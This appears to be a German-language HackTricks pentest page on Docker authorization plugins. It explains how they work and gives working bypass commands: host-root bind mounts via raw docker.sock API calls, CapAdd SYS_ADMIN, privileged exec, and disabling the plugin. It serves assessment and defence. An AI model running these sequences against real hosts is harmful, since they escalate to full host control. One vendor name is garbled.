# Runtime Authorization Plugins

{{#include ../../../banners/hacktricks-training.md}}

## Überblick

Runtime authorization plugins sind eine zusätzliche Policy-Schicht, die entscheidet, ob ein Aufrufer eine bestimmte Aktion des Daemons ausführen darf. Docker ist das klassische Beispiel. Standardmäßig hat jeder, der mit dem Docker-Daemon kommunizieren kann, effektiv weitreichende Kontrolle darüber. Authorization plugins versuchen, dieses Modell einzuschränken, indem sie den authentifizierten Benutzer und die angeforderte API-Operation prüfen und die Anfrage anschließend gemäß der Policy erlauben oder ablehnen.

Dieses Thema verdient eine eigene Seite, weil es das Exploitation-Modell verändert, wenn ein Angreifer bereits Zugriff auf eine Docker API oder auf einen Benutzer in der `docker`-Gruppe hat. In solchen Umgebungen lautet die Frage nicht mehr nur: "Kann ich den Daemon erreichen?", sondern auch: "Ist der Daemon durch eine Authorization-Schicht abgesichert, und kann diese Schicht über nicht behandelte Endpoints, schwaches JSON-Parsing oder Berechtigungen zur Plugin-Verwaltung umgangen werden?"

## Funktionsweise

Wenn eine Anfrage den Docker-Daemon erreicht, kann das Authorization-Subsystem den Anfragekontext an ein oder mehrere installierte Plugins weitergeben. Das Plugin sieht die Identität des authentifizierten Benutzers, die Details der Anfrage, ausgewählte Header sowie Teile des Request- oder Response-Bodys, sofern der Content-Type geeignet ist. Mehrere Plugins können verkettet werden, und der Zugriff wird nur gewährt, wenn alle Plugins die Anfrage erlauben.

Dieses Modell klingt solide, aber seine Sicherheit hängt vollständig davon ab, wie vollständig der Policy-Autor die API verstanden hat. Ein Plugin, das `docker run --privileged` blockiert, aber `docker exec` ignoriert, alternative JSON-Schlüssel wie `Binds` auf Top-Level übersieht oder die Plugin-Administration erlaubt, kann ein falsches Gefühl der Einschränkung erzeugen, während weiterhin direkte Privilege-Escalation-Pfade offen bleiben.

## Häufige Plugin-Ziele

Wichtige Bereiche für die Policy-Überprüfung sind:

- Endpoints zur Container-Erstellung
- `HostConfig`-Felder wie `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` und Optionen zum Teilen von Namespaces
- das Verhalten von `docker exec`
- Endpoints zur Plugin-Verwaltung
- alle Endpoints, die indirekt Runtime-Aktionen außerhalb des vorgesehenen Policy-Modells auslösen können

Historisch machten Beispiele wie Twილock's `authz`-Plugin und einfache Educational Plugins wie `authobot` dieses Modell leicht untersuchbar, da ihre Policy-Dateien und Codepfade zeigten, wie die Zuordnung von Endpoints zu Aktionen tatsächlich implementiert wurde. Für Assessments ist die wichtigste Erkenntnis, dass der Policy-Autor die vollständige API-Oberfläche verstehen muss und nicht nur die sichtbarsten CLI-Befehle.

## Abuse

Das erste Ziel besteht darin herauszufinden, was tatsächlich blockiert wird. Wenn der Daemon eine Aktion verweigert, leakt der Fehler häufig den Namen des Plugins, was dabei hilft, die verwendete Kontrolle zu identifizieren:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Wenn du ein umfassenderes Endpoint-Profiling benötigst, sind Tools wie `docker_auth_profiler` hilfreich, da sie die ansonsten repetitive Aufgabe automatisieren, zu überprüfen, welche API-Routen und JSON-Strukturen vom Plugin tatsächlich zugelassen werden.

Wenn die Umgebung ein benutzerdefiniertes Plugin verwendet und du mit der API interagieren kannst, ermittle, welche Objektfelder tatsächlich gefiltert werden:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Diese Prüfungen sind wichtig, weil viele Autorisierungsfehler feldspezifisch und nicht konzeptbezogen sind. Ein Plugin kann ein CLI-Muster ablehnen, ohne die gleichwertige API-Struktur vollständig zu blockieren.

### Vollständiges Beispiel: `docker exec` fügt nach der Container-Erstellung Privilegien hinzu

Eine Richtlinie, die die Erstellung privilegierter Container blockiert, aber die Erstellung uneingeschränkter Container zusammen mit `docker exec` erlaubt, kann dennoch umgangen werden:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Wenn der Daemon den zweiten Schritt akzeptiert, hat der Benutzer einen privilegierten interaktiven Prozess innerhalb eines Containers wiedererlangt, von dem der Verfasser der Richtlinie glaubte, dass er eingeschränkt sei.

### Vollständiges Beispiel: Bind Mount über die Raw API

Einige fehlerhafte Richtlinien prüfen nur eine JSON-Struktur. Wenn der Bind Mount des Root-Dateisystems nicht konsistent blockiert wird, kann der Host weiterhin gemountet werden:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Dieselbe Idee kann auch unter `HostConfig` auftreten:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Die Auswirkung ist ein vollständiger Escape aus dem Host-Dateisystem. Das interessante Detail ist, dass der Bypass durch eine unvollständige Abdeckung der Policy und nicht durch einen Kernel-Bug entsteht.

### Vollständiges Beispiel: Nicht überprüftes Capability-Attribut

Wenn die Policy vergisst, ein Capability-bezogenes Attribut zu filtern, kann der Angreifer einen Container erstellen, der eine gefährliche Capability zurückerlangt:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Sobald `CAP_SYS_ADMIN` oder eine ähnlich starke Capability vorhanden ist, werden viele in [capabilities.md](protections/capabilities.md) und [privileged-containers.md](privileged-containers.md) beschriebenen Breakout-Techniken erreichbar.

### Vollständiges Beispiel: Deaktivieren des Plugins

Wenn Plugin-Management-Operationen erlaubt sind, besteht der sauberste Bypass möglicherweise darin, die Kontrolle vollständig zu deaktivieren:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Dies ist ein Richtlinienfehler auf Ebene der Kontrollplane. Die Autorisierungsschicht ist vorhanden, aber der Benutzer, dessen Zugriff sie eigentlich einschränken sollte, besitzt weiterhin die Berechtigung, sie zu deaktivieren.

## Prüfungen

Diese Befehle dienen dazu festzustellen, ob eine Richtlinienebene vorhanden ist und ob sie vollständig oder nur oberflächlich umgesetzt wurde.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Was ist hier interessant:

- Denial-Meldungen, die einen Plugin-Namen enthalten, bestätigen eine Authorization-Schicht und geben häufig die genaue Implementierung preis.
- Eine für den Angreifer sichtbare Plugin-Liste kann ausreichen, um festzustellen, ob Deaktivierungs- oder Rekonfigurationsvorgänge möglich sind.
- Eine Policy, die nur offensichtliche CLI-Aktionen blockiert, aber keine Raw-API-Requests, sollte als umgehbar behandelt werden, bis das Gegenteil bewiesen ist.

## Runtime-Standardeinstellungen

| Runtime / Plattform | Standardstatus | Standardverhalten | Häufige manuelle Abschwächung |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig nicht aktiviert | Der Zugriff auf den Daemon ist effektiv vollständig oder gar nicht möglich, sofern kein Authorization-Plugin konfiguriert ist | unvollständige Plugin-Policy, Blacklists anstelle von Allowlists, Erlaubnis zur Plugin-Verwaltung, Blind Spots auf Feldebene |
| Podman | Kein übliches direktes Äquivalent | Podman verlässt sich typischerweise eher auf Unix-Berechtigungen, rootless-Ausführung und Entscheidungen zur API-Exposition als auf Docker-ähnliche Authz-Plugins | breite Exposition einer rootful-Podman-API, schwache Socket-Berechtigungen |
| containerd / CRI-O | Anderes Kontrollmodell | Diese Runtimes verlassen sich üblicherweise auf Socket-Berechtigungen, Node-Trust-Grenzen und Controls höherer Orchestrator-Ebenen statt auf Docker-Authz-Plugins | Einbinden des Sockets in Workloads, schwache lokale Trust-Annahmen auf dem Node |
| Kubernetes | Verwendet Authn/Authz auf den API-Server- und Kubelet-Ebenen, keine Docker-Authz-Plugins | Cluster-RBAC und Admission-Controls sind die wichtigsten Policy-Schichten | übermäßig weit gefasstes RBAC, schwache Admission-Policy, direkte Exposition von Kubelet- oder Runtime-APIs |

{{#include ../../../banners/hacktricks-training.md}}
